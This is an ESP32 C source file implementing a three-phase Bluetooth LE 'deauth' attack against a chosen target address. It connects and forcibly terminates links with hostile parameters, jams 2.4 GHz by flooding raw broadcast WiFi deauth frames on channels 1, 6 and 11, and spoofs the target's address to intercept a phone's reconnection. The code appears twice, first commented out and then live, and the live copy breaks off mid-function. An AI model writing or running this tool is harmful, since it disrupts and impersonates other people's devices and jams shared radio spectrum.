// /* BLE Deauth - Force disconnect target's active BLE connections
//  *
//  * Three-phase attack strategy:
//  *
//  * Phase 1 (Direct Connect): Target is advertising → connect, hostile params, terminate
//  *
//  * Phase 2 (WiFi RF Jam): Target is NOT advertising (connected to phone) →
//  *   Use WiFi 802.11 raw transmission on channels 1/6/11 to create
//  *   RF interference that overlaps BLE data channels. This corrupts
//  *   BLE packets between phone and target → supervision timeout →
//  *   connection drops. Then Phase 1 takes over.
//  *
//  * Phase 3 (Address Spoof): After jamming, advertise as target
//  *   to capture phone's reconnection attempt.
//  */
// #include "ble_deauth.h"
// #include "esp_log.h"
// #include "freertos/FreeRTOS.h"
// #include "freertos/task.h"
// #include "freertos/semphr.h"
// #include <string.h>

// /* NimBLE headers */
// #include "nimble/nimble_port.h"
// #include "host/ble_hs.h"
// #include "host/ble_gap.h"

// /* WiFi headers — for RF jam */
// #include "esp_wifi.h"

// #include "ble_common.h"

// static const char *TAG = "ble_deauth";
// static bool running = false;
// static TaskHandle_t task_handle = NULL;
// static char target[32] = {0};
// static SemaphoreHandle_t mutex = NULL;
// static SemaphoreHandle_t task_exit_sem = NULL;
// static SemaphoreHandle_t conn_done_sem = NULL;

// static uint8_t try_addr_type = BLE_ADDR_PUBLIC;
// static int connect_count = 0;
// static int status13_count = 0;
// static int phase = 1;

// #define JAM_THRESHOLD 3      /* status-13 count before switching to Phase 2 */
// #define WIFI_JAM_ROUNDS 3    /* number of channel-sweep rounds */
// #define SPOOF_DURATION 5     /* seconds of spoof advertising */

// static const struct ble_gap_conn_params conn_params = {
//     .scan_itvl = 0x0010,
//     .scan_window = 0x0010,
//     .itvl_min = 0x0006,
//     .itvl_max = 0x000C,
//     .latency = 0,
//     .supervision_timeout = 0x0064,
//     .min_ce_len = 0,
//     .max_ce_len = 0,
// };

// /* ble_gap_update_params() needs ble_gap_upd_params, NOT ble_gap_conn_params. */
// static const struct ble_gap_upd_params hostile_upd_params = {
//     .itvl_min = 0x0006,
//     .itvl_max = 0x0006,
//     .latency = 499,
//     .supervision_timeout = 0x000A,
//     .min_ce_len = 0,
//     .max_ce_len = 0,
// };

// /* Forward declaration — run_phase2_jam() calls run_phase3_spoof() */
// static void run_phase3_spoof(void);

// static void addr_from_str(const char *s, uint8_t out[6]) {
//     int vals[6] = {0};
//     if (sscanf(s, "%x:%x:%x:%x:%x:%x",
//                &vals[0], &vals[1], &vals[2],
//                &vals[3], &vals[4], &vals[5]) == 6) {
//         for (int i = 0; i < 6; i++) {
//             out[i] = (uint8_t)vals[5 - i];
//         }
//     } else {
//         memset(out, 0, 6);
//     }
// }

// /* Clean up all BLE state before each attempt */
// static void cleanup_ble_state(void) {
//     int max_wait = 10;
//     while (max_wait-- > 0) {
//         bool busy = ble_gap_conn_active() || ble_gap_adv_active() || ble_gap_disc_active();
//         if (!busy) break;

//         if (ble_gap_conn_active()) {
//             ble_gap_conn_cancel();
//         }
//         if (ble_gap_adv_active()) {
//             ble_gap_adv_stop();
//         }
//         if (ble_gap_disc_active()) {
//             ble_gap_disc_cancel();
//         }
//         vTaskDelay(pdMS_TO_TICKS(100));
//     }

//     /* Also make sure no lingering connections */
//     ble_common_disconnect_all();
//     vTaskDelay(pdMS_TO_TICKS(100));
// }

// static int deauth_event_cb(struct ble_gap_event *event, void *arg) {
//     switch (event->type) {
//         case BLE_GAP_EVENT_CONNECT:
//             if (event->connect.status == 0) {
//                 connect_count++;
//                 status13_count = 0;
//                 uint16_t conn_handle = event->connect.conn_handle;
//                 ESP_LOGI(TAG, "DEAUTH: Connected! conn_handle=%d (#%d)",
//                          conn_handle, connect_count);

//                 int rc = ble_gap_update_params(conn_handle, &hostile_upd_params);
//                 if (rc != 0) {
//                     ESP_LOGD(TAG, "Conn update failed: %d", rc);
//                 }

//                 uint8_t error_codes[] = {
//                     BLE_ERR_REM_USER_CONN_TERM,
//                     0x3B,
//                     BLE_ERR_UNSPECIFIED,
//                     BLE_ERR_UNSUPP_REM_FEATURE,
//                 };
//                 uint8_t err_code = error_codes[connect_count % 4];

//                 rc = ble_gap_terminate(conn_handle, err_code);
//                 if (rc) {
//                     ESP_LOGD(TAG, "Terminate failed: %d", rc);
//                 }

//                 ESP_LOGI(TAG, "Deauth hit! Error code 0x%02X sent.", err_code);
//             } else {
//                 ESP_LOGW(TAG, "DEAUTH: Connect failed status=%d", event->connect.status);

//                 if (event->connect.status == 13) {
//                     status13_count++;
//                     try_addr_type = (try_addr_type == BLE_ADDR_PUBLIC)
//                         ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;

//                     if (status13_count >= JAM_THRESHOLD && phase == 1) {
//                         phase = 2;
//                         ESP_LOGI(TAG, "Target not advertising. Switching to PHASE 2: WiFi RF Jam");
//                     }
//                 }
//             }

//             if (conn_done_sem) xSemaphoreGive(conn_done_sem);
//             break;

//         case BLE_GAP_EVENT_DISCONNECT:
//             ESP_LOGI(TAG, "DEAUTH: Disconnected reason=%d", event->disconnect.reason);
//             if (conn_done_sem) xSemaphoreGive(conn_done_sem);
//             break;

//         case BLE_GAP_EVENT_CONN_UPDATE:
//             ESP_LOGD(TAG, "Conn update result: status=%d", event->conn_update.status);
//             break;

//         default:
//             break;
//     }
//     return 0;
// }

// /* Phase 3 callback — when phone connects during spoof */
// static int spoof_event_cb(struct ble_gap_event *event, void *arg) {
//     switch (event->type) {
//         case BLE_GAP_EVENT_CONNECT:
//             if (event->connect.status == 0) {
//                 connect_count++;
//                 uint16_t conn_handle = event->connect.conn_handle;
//                 ESP_LOGI(TAG, "SPOOF: Phone connected! conn_handle=%d (#%d)",
//                          conn_handle, connect_count);

//                 ble_gap_update_params(conn_handle, &hostile_upd_params);

//                 uint8_t error_codes[] = {
//                     BLE_ERR_REM_USER_CONN_TERM, 0x3B,
//                     BLE_ERR_UNSPECIFIED, BLE_ERR_UNSUPP_REM_FEATURE,
//                 };
//                 ble_gap_terminate(conn_handle, error_codes[connect_count % 4]);
//             }
//             break;
//         case BLE_GAP_EVENT_DISCONNECT:
//             ESP_LOGI(TAG, "SPOOF: Disconnected reason=%d", event->disconnect.reason);
//             break;
//     }
//     return 0;
// }

// /* ============ PHASE 2: WiFi RF Jam ============
//  *
//  * Use WiFi 802.11 raw transmission to create RF interference on 2.4GHz.
//  *
//  * WiFi channels 1, 6, 11 overlap with BLE data channels:
//  *   WiFi Ch 1  (2412 MHz) → BLE data ch 4-8
//  *   WiFi Ch 6  (2437 MHz) → BLE data ch 13-17
//  *   WiFi Ch 11 (2462 MHz) → BLE data ch 26-30
//  *
//  * BLE uses adaptive frequency hopping — if enough channels are corrupted,
//  * the link can't maintain itself → supervision timeout → connection drops.
//  *
//  * This is how real BLE jammers work: transmit noise on the same frequencies.
//  */
// static void run_phase2_jam(void) {
//     ESP_LOGI(TAG, "========================================");
//     ESP_LOGI(TAG, "PHASE 2: WiFi RF Jam");
//     ESP_LOGI(TAG, "Transmitting on WiFi ch 1/6/11 to disrupt BLE");
//     ESP_LOGI(TAG, "(This covers BLE data channels 4-8, 13-17, 26-30)");
//     ESP_LOGI(TAG, "========================================");

//     /* Save current WiFi channel so we can restore it */
//     uint8_t orig_ch = 1;
//     wifi_second_chan_t orig_second = WIFI_SECOND_CHAN_NONE;
//     esp_wifi_get_channel(&orig_ch, &orig_second);
//     ESP_LOGI(TAG, "Current WiFi channel: %d (will restore after jam)", orig_ch);

//     /* Build a broadcast deauth frame — creates maximum RF energy.
//      * The frame content doesn't matter much; what matters is the
//      * raw RF transmission on the target frequencies. */
//     uint8_t ap_mac[6] = {0};
//     esp_wifi_get_mac(WIFI_IF_AP, ap_mac);

//     uint8_t jam_frame[26];
//     jam_frame[0]  = 0xC0; jam_frame[1]  = 0x00;  /* Type: Deauth */
//     jam_frame[2]  = 0x00; jam_frame[3]  = 0x00;  /* Duration */
//     jam_frame[4]  = 0xFF; jam_frame[5]  = 0xFF;  /* DA: broadcast */
//     jam_frame[6]  = 0xFF; jam_frame[7]  = 0xFF;
//     jam_frame[8]  = 0xFF; jam_frame[9]  = 0xFF;
//     memcpy(&jam_frame[10], ap_mac, 6);            /* SA: our MAC */
//     memcpy(&jam_frame[16], ap_mac, 6);            /* BSSID: our MAC */
//     jam_frame[22] = 0x00; jam_frame[23] = 0x00;  /* Seq number */
//     jam_frame[24] = 0x01; jam_frame[25] = 0x00;  /* Reason */

//     /* Cycle through WiFi channels 1, 6, 11 to cover most BLE data channels */
//     int wifi_channels[] = {1, 6, 11};
//     int frames_per_burst = 200;

//     for (int r = 0; r < WIFI_JAM_ROUNDS && running; r++) {
//         ESP_LOGI(TAG, "WiFi jam round %d/%d", r + 1, WIFI_JAM_ROUNDS);

//         for (int c = 0; c < 3 && running; c++) {
//             /* Change WiFi channel to target BLE frequencies */
//             esp_err_t ret = esp_wifi_set_channel(wifi_channels[c], WIFI_SECOND_CHAN_NONE);
//             if (ret != ESP_OK) {
//                 ESP_LOGD(TAG, "Set WiFi ch %d failed: %s", wifi_channels[c], esp_err_to_name(ret));
//                 continue;
//             }
//             /* Small delay for channel change to take effect */
//             vTaskDelay(pdMS_TO_TICKS(30));

//             /* Send rapid raw 802.11 frames — creates RF interference */
//             int sent = 0;
//             for (int i = 0; i < frames_per_burst && running; i++) {
//                 ret = esp_wifi_80211_tx(WIFI_IF_AP, jam_frame, sizeof(jam_frame), true);
//                 if (ret == ESP_OK) sent++;
//             }
//             ESP_LOGI(TAG, "  WiFi ch %d: sent %d/%d frames", wifi_channels[c], sent, frames_per_burst);

//             /* Brief pause between channels */
//             vTaskDelay(pdMS_TO_TICKS(20));
//         }
//     }

//     /* Restore original WiFi channel — AP will resume normal operation */
//     esp_wifi_set_channel(orig_ch, orig_second);
//     ESP_LOGI(TAG, "WiFi channel restored to %d", orig_ch);

//     /* Wait for BLE supervision timeout to fire (typically 2-20 seconds) */
//     ESP_LOGI(TAG, "Waiting 5s for BLE supervision timeout...");
//     int wait_ms = 0;
//     while (running && wait_ms < 5000) {
//         vTaskDelay(pdMS_TO_TICKS(500));
//         wait_ms += 500;
//     }

//     /* Now check if target is advertising (connection dropped) */
//     cleanup_ble_state();

//     uint8_t addr_val[6];
//     xSemaphoreTake(mutex, portMAX_DELAY);
//     char copy[32];
//     strncpy(copy, target, sizeof(copy) - 1);
//     copy[sizeof(copy) - 1] = '\0';
//     xSemaphoreGive(mutex);
//     addr_from_str(copy, addr_val);

//     uint8_t own_addr_type = ble_common_own_addr_type();

//     /* Try both address types */
//     for (int attempt = 0; attempt < 2 && running; attempt++) {
//         ble_addr_t peer;
//         peer.type = (attempt == 0) ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM;
//         memcpy(peer.val, addr_val, 6);

//         xSemaphoreTake(conn_done_sem, 0);

//         ESP_LOGI(TAG, "Checking if target is advertising (addr_type=%s)...",
//                  peer.type == BLE_ADDR_PUBLIC ? "PUBLIC" : "RANDOM");

//         int rc = ble_gap_connect(own_addr_type, &peer, 3000,
//                                  &conn_params, deauth_event_cb, NULL);
//         if (rc == 0) {
//             if (xSemaphoreTake(conn_done_sem, pdMS_TO_TICKS(4000)) != pdTRUE) {
//                 if (ble_gap_conn_active()) ble_gap_conn_cancel();
//             }

//             if (status13_count == 0) {
//                 /* Target is advertising! WiFi jam worked! */
//                 ESP_LOGI(TAG, "WiFi jam SUCCESS — target is advertising! Back to Phase 1.");
//                 phase = 1;
//                 status13_count = 0;
//                 return;
//             }
//         } else if (rc == BLE_HS_EBUSY || rc == BLE_HS_EALREADY) {
//             ble_gap_conn_cancel();
//             vTaskDelay(pdMS_TO_TICKS(200));
//         }
//     }

//     /* WiFi jam didn't break the connection — try Phase 3 (spoof) */
//     ESP_LOGI(TAG, "WiFi jam didn't break the connection. Trying Phase 3: Spoof.");
//     phase = 3;
//     run_phase3_spoof();

//     /* After spoof, go back to Phase 1 */
//     phase = 1;
//     status13_count = 0;
//     try_addr_type = BLE_ADDR_PUBLIC;
// }

// /* ============ PHASE 3: Address Spoof ============ */
// static void run_phase3_spoof(void) {
//     ESP_LOGI(TAG, "PHASE 3: Spoof advertise as target for %d seconds", SPOOF_DURATION);

//     cleanup_ble_state();

//     uint8_t target_addr[6];
//     xSemaphoreTake(mutex, portMAX_DELAY);
//     char scopy[32];
//     strncpy(scopy, target, sizeof(scopy) - 1);
//     scopy[sizeof(scopy) - 1] = '\0';
//     xSemaphoreGive(mutex);
//     addr_from_str(scopy, target_addr);

//     /* Set random address to look like target */
//     uint8_t spoof_addr[6];
//     memcpy(spoof_addr, target_addr, 6);
//     spoof_addr[5] = (spoof_addr[5] & 0x3F) | 0xC0;

//     int rc = ble_hs_id_set_rnd(spoof_addr);
//     if (rc != 0) {
//         ESP_LOGW(TAG, "Failed to set random addr (rc=%d)", rc);
//     }

//     /* Build advertisement data — looks like a BLE device */
//     uint8_t adv_data[] = {
//         0x02, 0x01, 0x06,                       /* Flags */
//         0x03, 0x03, 0x0F, 0x18,                 /* Battery Service UUID */
//         0x05, 0x09, 'B', 'L', 'E', 'D', 'v',    /* Name: "BLEDv" */
//     };

//     struct ble_gap_adv_params adv_params = {
//         .conn_mode = BLE_GAP_CONN_MODE_UND,
//         .disc_mode = BLE_GAP_DISC_MODE_GEN,
//         .itvl_min = 0x0020,   /* Fast: 20ms */
//         .itvl_max = 0x0030,   /* 30ms */
//         .channel_map = 0x07,
//         .filter_policy = 0,
//     };

//     ble_gap_adv_set_data(adv_data, sizeof(adv_data));
//     rc = ble_gap_adv_start(1, NULL, BLE_HS_FOREVER,
//                            &adv_params, spoof_event_cb, NULL);
//     if (rc != 0) {
//         ESP_LOGW(TAG, "Spoof adv start failed: %d", rc);
//         return;
//     }

//     ESP_LOGI(TAG, "Spoof advertising started! Waiting for phone to connect to us...");

//     /* Wait for SPOOF_DURATION seconds */
//     int elapsed = 0;
//     while (running && elapsed < SPOOF_DURATION * 10) {
//         vTaskDelay(pdMS_TO_TICKS(100));
//         elapsed++;
//     }

//     if (ble_gap_adv_active()) ble_gap_adv_stop();

//     ESP_LOGI(TAG, "Spoof phase done.");
// }

// /* ============ PHASE 1: Direct Connect ============ */
// static void run_phase1_connect(void) {
//     /* Clean up ALL stale BLE state before each attempt */
//     cleanup_ble_state();

//     xSemaphoreTake(mutex, portMAX_DELAY);
//     char copy[32];
//     strncpy(copy, target, sizeof(copy) - 1);
//     copy[sizeof(copy) - 1] = '\0';
//     xSemaphoreGive(mutex);

//     uint8_t addr_val[6];
//     addr_from_str(copy, addr_val);

//     ble_addr_t peer;
//     peer.type = try_addr_type;
//     memcpy(peer.val, addr_val, 6);

//     ESP_LOGI(TAG, "PHASE 1: Connect to %s (addr_type=%s, #%d)",
//              copy, try_addr_type == BLE_ADDR_PUBLIC ? "PUBLIC" : "RANDOM",
//              connect_count + 1);

//     xSemaphoreTake(conn_done_sem, 0);

//     uint8_t own_addr_type = ble_common_own_addr_type();

//     int rc = ble_gap_connect(own_addr_type, &peer, 3000,
//                              &conn_params, deauth_event_cb, NULL);
//     if (rc != 0) {
//         if (rc == BLE_HS_EBUSY || rc == BLE_HS_EALREADY) {
//             ESP_LOGD(TAG, "BLE busy (%d), cleaning up", rc);
//             ble_gap_conn_cancel();
//             vTaskDelay(pdMS_TO_TICKS(500));
//         } else {
//             ESP_LOGW(TAG, "ble_gap_connect returned %d", rc);
//             vTaskDelay(pdMS_TO_TICKS(1000));
//         }
//         return;
//     }

//     /* Wait for connection callback — up to 5 seconds */
//     if (xSemaphoreTake(conn_done_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
//         ESP_LOGW(TAG, "Connection timed out");
//         if (ble_gap_conn_active()) ble_gap_conn_cancel();
//     }

//     /* After successful connect+terminate, wait for re-advertise */
//     if (connect_count > 0 && status13_count == 0) {
//         ESP_LOGI(TAG, "Waiting 3s for target to re-advertise...");
//         vTaskDelay(pdMS_TO_TICKS(3000));
//     }
// }

// /* ============ Main task ============ */
// static void deauth_task(void *arg) {
//     ESP_LOGI(TAG, "BLE Deauth task started for target %s", target);
//     ESP_LOGI(TAG, "Phase 1: Direct | Phase 2: WiFi Jam | Phase 3: Spoof");

//     ble_common_disconnect_all();
//     vTaskDelay(pdMS_TO_TICKS(1000));

//     connect_count = 0;
//     status13_count = 0;
//     phase = 1;
//     try_addr_type = BLE_ADDR_PUBLIC;

//     while (running) {
//         if (phase == 1) {
//             run_phase1_connect();

//             if (status13_count > 0) {
//                 int backoff = status13_count * 300;
//                 if (backoff > 2000) backoff = 2000;
//                 vTaskDelay(pdMS_TO_TICKS(backoff));
//             } else {
//                 vTaskDelay(pdMS_TO_TICKS(200));
//             }
//         } else {
//             /* Phase 2 (includes Phase 3) */
//             run_phase2_jam();
//         }
//     }

//     cleanup_ble_state();

//     ESP_LOGI(TAG, "BLE Deauth task exiting (attempted %d deauths)", connect_count);
//     task_handle = NULL;
//     if (task_exit_sem) xSemaphoreGive(task_exit_sem);
//     vTaskDelete(NULL);
// }

// void ble_deauth_init(void) {
//     if (mutex == NULL) mutex = xSemaphoreCreateMutex();
//     if (task_exit_sem == NULL) task_exit_sem = xSemaphoreCreateBinary();
//     if (conn_done_sem == NULL) conn_done_sem = xSemaphoreCreateBinary();

//     ble_common_init();

//     ESP_LOGI(TAG, "ble_deauth initialized (3-phase: direct + WiFi jam + spoof)");
// }

// void ble_deauth_start(const char *target_addr) {
//     if (running) return;
//     if (mutex == NULL) mutex = xSemaphoreCreateMutex();
//     if (conn_done_sem == NULL) conn_done_sem = xSemaphoreCreateBinary();

//     xSemaphoreTake(mutex, portMAX_DELAY);
//     strncpy(target, target_addr ? target_addr : "", sizeof(target) - 1);
//     target[sizeof(target) - 1] = '\0';
//     xSemaphoreGive(mutex);

//     try_addr_type = BLE_ADDR_PUBLIC;
//     connect_count = 0;
//     status13_count = 0;
//     phase = 1;

//     running = true;

//     if (task_exit_sem != NULL) xSemaphoreTake(task_exit_sem, 0);

//     BaseType_t ret = xTaskCreate(deauth_task, "ble_deauth", 4096, NULL, 5, &task_handle);
//     if (ret != pdPASS) {
//         ESP_LOGE(TAG, "Failed to create deauth task");
//         running = false;
//     }
// }

// void ble_deauth_stop(void) {
//     if (!running) return;
//     running = false;

//     if (conn_done_sem) xSemaphoreGive(conn_done_sem);

//     if (task_exit_sem != NULL) {
//         if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
//             ESP_LOGW(TAG, "Task exit timeout, forcing delete");
//             if (task_handle != NULL) {
//                 vTaskDelete(task_handle);
//                 task_handle = NULL;
//             }
//         }
//     } else {
//         vTaskDelay(pdMS_TO_TICKS(1000));
//         if (task_handle != NULL) {
//             vTaskDelete(task_handle);
//             task_handle = NULL;
//         }
//     }

//     ESP_LOGI(TAG, "BLE Deauth stopped (attempted %d deauths)", connect_count);
// }

// bool ble_deauth_is_running(void) {
//     return running;
// }


/* BLE Deauth - Force disconnect target's active BLE connections
 *
 * Three-phase attack strategy:
 *
 * Phase 1 (Direct Connect): Target is advertising → connect, hostile params, terminate
 *
 * Phase 2 (WiFi RF Jam): Target is NOT advertising (connected to phone) →
 *   Use WiFi 802.11 raw transmission on channels 1/6/11 to create
 *   RF interference that overlaps BLE data channels. This corrupts
 *   BLE packets between phone and target → supervision timeout →
 *   connection drops. Then Phase 1 takes over.
 *
 * Phase 3 (Address Spoof): After jamming, advertise as target
 *   to capture phone's reconnection attempt.
 */
#include "ble_deauth.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <string.h>

/* NimBLE headers */
#include "nimble/nimble_port.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"

/* WiFi headers — for RF jam */
#include "esp_wifi.h"

#include "ble_common.h"

static const char *TAG = "ble_deauth";
static bool running = false;
static TaskHandle_t task_handle = NULL;
static char target[32] = {0};
static SemaphoreHandle_t mutex = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;
static SemaphoreHandle_t conn_done_sem = NULL;

static uint8_t try_addr_type = BLE_ADDR_PUBLIC;
static int connect_count = 0;
static int status13_count = 0;
static int phase = 1;

#define JAM_THRESHOLD 3      /* status-13 count before switching to Phase 2 */
#define WIFI_JAM_ROUNDS 3    /* number of channel-sweep rounds */
#define SPOOF_DURATION 5     /* seconds of spoof advertising */

static const struct ble_gap_conn_params conn_params = {
    .scan_itvl = 0x0010,
    .scan_window = 0x0010,
    .itvl_min = 0x0006,
    .itvl_max = 0x000C,
    .latency = 0,
    .supervision_timeout = 0x0064,
    .min_ce_len = 0,
    .max_ce_len = 0,
};

/* ble_gap_update_params() needs ble_gap_upd_params, NOT ble_gap_conn_params. */
static const struct ble_gap_upd_params hostile_upd_params = {
    .itvl_min = 0x0006,
    .itvl_max = 0x0006,
    .latency = 499,
    .supervision_timeout = 0x000A,
    .min_ce_len = 0,
    .max_ce_len = 0,
};

/* Forward declaration — run_phase2_jam() calls run_phase3_spoof() */
static void run_phase3_spoof(void);

static void addr_from_str(const char *s, uint8_t out[6]) {
    int vals[6] = {0};
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2],
               &vals[3], &vals[4], &vals[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            out[i] = (uint8_t)vals[5 - i];
        }
    } else {
        memset(out, 0, 6);
    }
}

/* Clean up all BLE state before each attempt */
static void cleanup_ble_state(void) {
    int max_wait = 10;
    while (max_wait-- > 0) {
        bool busy = ble_gap_conn_active() || ble_gap_adv_active() || ble_gap_disc_active();
        if (!busy) break;

        if (ble_gap_conn_active()) {
            ble_gap_conn_cancel();
        }
        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
        }
        if (ble_gap_disc_active()) {
            ble_gap_disc_cancel();
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    /* Also make sure no lingering connections */
    ble_common_disconnect_all();
    vTaskDelay(pdMS_TO_TICKS(100));
}

static int deauth_event_cb(struct ble_gap_event *event, void *arg) {
    switch (event->type) {
        case BLE_GAP_EVENT_CONNECT:
            if (event->connect.status == 0) {
                connect_count++;
                status13_count = 0;
                uint16_t conn_handle = event->connect.conn_handle;
                ESP_LOGI(TAG, "DEAUTH: Connected! conn_handle=%d (#%d)",
                         conn_handle, connect_count);

                int rc = ble_gap_update_params(conn_handle, &hostile_upd_params);
                if (rc != 0) {
                    ESP_LOGD(TAG, "Conn update failed: %d", rc);
                }

                uint8_t error_codes[] = {
                    BLE_ERR_REM_USER_CONN_TERM,
                    0x3B,
                    BLE_ERR_UNSPECIFIED,
                    BLE_ERR_UNSUPP_REM_FEATURE,
                };
                uint8_t err_code = error_codes[connect_count % 4];

                rc = ble_gap_terminate(conn_handle, err_code);
                if (rc) {
                    ESP_LOGD(TAG, "Terminate failed: %d", rc);
                }

                ESP_LOGI(TAG, "Deauth hit! Error code 0x%02X sent.", err_code);
            } else {
                ESP_LOGW(TAG, "DEAUTH: Connect failed status=%d", event->connect.status);

                if (event->connect.status == 13) {
                    status13_count++;
                    try_addr_type = (try_addr_type == BLE_ADDR_PUBLIC)
                        ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;

                    if (status13_count >= JAM_THRESHOLD && phase == 1) {
                        phase = 2;
                        ESP_LOGI(TAG, "Target not advertising. Switching to PHASE 2: WiFi RF Jam");
                    }
                }
            }

            if (conn_done_sem) xSemaphoreGive(conn_done_sem);
            break;

        case BLE_GAP_EVENT_DISCONNECT:
            ESP_LOGI(TAG, "DEAUTH: Disconnected reason=%d", event->disconnect.reason);
            if (conn_done_sem) xSemaphoreGive(conn_done_sem);
            break;

        case BLE_GAP_EVENT_CONN_UPDATE:
            ESP_LOGD(TAG, "Conn update result: status=%d", event->conn_update.status);
            break;

        default:
            break;
    }
    return 0;
}

/* Phase 3 callback — when phone connects during spoof */
static int spoof_event_cb(struct ble_gap_event *event, void *arg) {
    switch (event->type) {
        case BLE_GAP_EVENT_CONNECT:
            if (event->connect.status == 0) {
                connect_count++;
                uint16_t conn_handle = event->connect.conn_handle;
                ESP_LOGI(TAG, "SPOOF: Phone connected! conn_handle=%d (#%d)",
                         conn_handle, connect_count);

                ble_gap_update_params(conn_handle, &hostile_upd_params);

                uint8_t error_codes[] = {
                    BLE_ERR_REM_USER_CONN_TERM, 0x3B,
                    BLE_ERR_UNSPECIFIED, BLE_ERR_UNSUPP_REM_FEATURE,
                };
                ble_gap_terminate(conn_handle, error_codes[connect_count % 4]);
            }
            break;
        case BLE_GAP_EVENT_DISCONNECT:
            ESP_LOGI(TAG, "SPOOF: Disconnected reason=%d", event->disconnect.reason);
            break;
    }
    return 0;
}

/* ============ PHASE 2: WiFi RF Jam ============
 *
 * Use WiFi 802.11 raw transmission to create RF interference on 2.4GHz.
 *
 * WiFi channels 1, 6, 11 overlap with BLE data channels:
 *   WiFi Ch 1  (2412 MHz) → BLE data ch 4-8
 *   WiFi Ch 6  (2437 MHz) → BLE data ch 13-17
 *   WiFi Ch 11 (2462 MHz) → BLE data ch 26-30
 *
 * BLE uses adaptive frequency hopping — if enough channels are corrupted,
 * the link can't maintain itself → supervision timeout → connection drops.
 *
 * This is how real BLE jammers work: transmit noise on the same frequencies.
 */
static void run_phase2_jam(void) {
    ESP_LOGI(TAG, "========================================");
    ESP_LOGI(TAG, "PHASE 2: WiFi RF Jam");
    ESP_LOGI(TAG, "Transmitting on WiFi ch 1/6/11 to disrupt BLE");
    ESP_LOGI(TAG, "(This covers BLE data channels 4-8, 13-17, 26-30)");
    ESP_LOGI(TAG, "========================================");

    /* Save current WiFi channel so we can restore it */
    uint8_t orig_ch = 1;
    wifi_second_chan_t orig_second = WIFI_SECOND_CHAN_NONE;
    esp_wifi_get_channel(&orig_ch, &orig_second);
    ESP_LOGI(TAG, "Current WiFi channel: %d (will restore after jam)", orig_ch);

    /* Build a broadcast deauth frame — creates maximum RF energy.
     * The frame content doesn't matter much; what matters is the
     * raw RF transmission on the target frequencies. */
    uint8_t ap_mac[6] = {0};
    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);

    uint8_t jam_frame[26];
    jam_frame[0]  = 0xC0; jam_frame[1]  = 0x00;  /* Type: Deauth */
    jam_frame[2]  = 0x00; jam_frame[3]  = 0x00;  /* Duration */
    jam_frame[4]  = 0xFF; jam_frame[5]  = 0xFF;  /* DA: broadcast */
    jam_frame[6]  = 0xFF; jam_frame[7]  = 0xFF;
    jam_frame[8]  = 0xFF; jam_frame[9]  = 0xFF;
    memcpy(&jam_frame[10], ap_mac, 6);            /* SA: our MAC */
    memcpy(&jam_frame[16], ap_mac, 6);            /* BSSID: our MAC */
    jam_frame[22] = 0x00; jam_frame[23] = 0x00;  /* Seq number */
    jam_frame[24] = 0x01; jam_frame[25] = 0x00;  /* Reason */

    /* Cycle through WiFi channels 1, 6, 11 to cover most BLE data channels */
    int wifi_channels[] = {1, 6, 11};
    int frames_per_burst = 200;

    for (int r = 0; r < WIFI_JAM_ROUNDS && running; r++) {
        ESP_LOGI(TAG, "WiFi jam round %d/%d", r + 1, WIFI_JAM_ROUNDS);

        for (int c = 0; c < 3 && running; c++) {
            /* Change WiFi channel to target BLE frequencies */
            esp_err_t ret = esp_wifi_set_channel(wifi_channels[c], WIFI_SECOND_CHAN_NONE);
            if (ret != ESP_OK) {
                ESP_LOGD(TAG, "Set WiFi ch %d failed: %s", wifi_channels[c], esp_err_to_name(ret));
                continue;
            }
            /* Small delay for channel change to take effect */
            vTaskDelay(pdMS_TO_TICKS(30));

            /* Send rapid raw 802.11 frames — creates RF interference */
            int sent = 0;
            for (int i = 0; i < frames_per_burst && running; i++) {
                ret = esp_wifi_80211_tx(WIFI_IF_AP, jam_frame, sizeof(jam_frame), true);
                if (ret == ESP_OK) sent++;
            }
            ESP_LOGI(TAG, "  WiFi ch %d: sent %d/%d frames", wifi_channels[c], sent, frames_per_burst);

            /* Brief pause between channels */
            vTaskDelay(pdMS_TO_TICKS(20));
        }
    }

    /* Restore original WiFi channel — AP will resume normal operation */
    esp_wifi_set_channel(orig_ch, orig_second);
    ESP_LOGI(TAG, "WiFi channel restored to %d", orig_ch);

    /* Wait for BLE supervision timeout to fire (typically 2-20 seconds) */
    ESP_LOGI(TAG, "Waiting 5s for BLE supervision timeout...");
    int wait_ms = 0;
    while (running && wait_ms < 5000) {
        vTaskDelay(pdMS_TO_TICKS(500));
        wait_ms += 500;
    }

    /* Now check if target is advertising (connection dropped) */
    cleanup_ble_state();

    uint8_t addr_val[6];
    xSemaphoreTake(mutex, portMAX_DELAY);
    char copy[32];
    strncpy(copy, target, sizeof(copy) - 1);
    copy[sizeof(copy) - 1] = '\0';
    xSemaphoreGive(mutex);
    addr_from_str(copy, addr_val);

    uint8_t own_addr_type = ble_common_own_addr_type();

    /* Try both address types */
    for (int attempt = 0; attempt < 2 && running; attempt++) {
        ble_addr_t peer;
        peer.type = (attempt == 0) ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM;
        memcpy(peer.val, addr_val, 6);

        xSemaphoreTake(conn_done_sem, 0);

        ESP_LOGI(TAG, "Checking if target is advertising (addr_type=%s)...",
                 peer.type == BLE_ADDR_PUBLIC ? "PUBLIC" : "RANDOM");

        int rc = ble_gap_connect(own_addr_type, &peer, 3000,
                                 &conn_params, deauth_event_cb, NULL);
        if (rc == 0) {
            if (xSemaphoreTake(conn_done_sem, pdMS_TO_TICKS(4000)) != pdTRUE) {
                if (ble_gap_conn_active()) ble_gap_conn_cancel();
            }

            if (status13_count == 0) {
                /* Target is advertising! WiFi jam worked! */
                ESP_LOGI(TAG, "WiFi jam SUCCESS — target is advertising! Back to Phase 1.");
                phase = 1;
                status13_count = 0;
                return;
            }
        } else if (rc == BLE_HS_EBUSY || rc == BLE_HS_EALREADY) {
